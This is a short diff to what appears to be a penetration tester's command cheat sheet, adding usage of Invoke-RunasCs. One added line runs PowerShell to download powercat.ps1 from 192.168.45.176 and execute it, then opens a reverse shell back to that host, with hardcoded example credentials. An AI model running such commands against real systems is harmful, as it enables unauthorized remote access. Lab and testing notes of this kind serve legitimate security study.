@@ -619,7 +619,11 @@ winexe -U '<% tp.frontmatter["USERNAME"] %>%<% tp.frontmatter["PASSWORD"] %>' --
 ```
 
 
-
+# Invoke-RunasCs.ps1 https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1
+```bash
+Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"
+Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "Powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.176:8000/powercat.ps1');powercat -c 192.168.45.176 -p 5555 -e cmd"
+```
 
 
 
